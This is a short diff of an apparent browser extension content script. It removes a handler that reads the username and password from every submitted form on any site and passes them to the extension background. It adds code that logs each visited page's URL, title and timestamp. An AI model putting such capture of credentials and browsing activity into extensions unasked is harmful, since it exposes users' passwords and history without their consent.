@@ -1,14 +1,9 @@
-document.addEventListener("submit", (e) => {
-    const form = e.target;
-    const url = window.location.origin;
-    const username = form.querySelector('input[type="text"], input[type="email"]')?.value;
-    const password = form.querySelector('input[type="password"]')?.value;
-  
-    if (username && password) {
-      browser.runtime.sendMessage({
-        type: "SAVE_CREDENTIALS",
-        data: { url, username, password }
-      });
-    }
-  });
-  
+// Quando una nuova pagina viene caricata, invia l'URL al background
+chrome.runtime.sendMessage({
+  type: 'LOG_SITE',
+  data: {
+    url: window.location.href,
+    title: document.title,
+    timestamp: new Date().toISOString()
+  }
+});
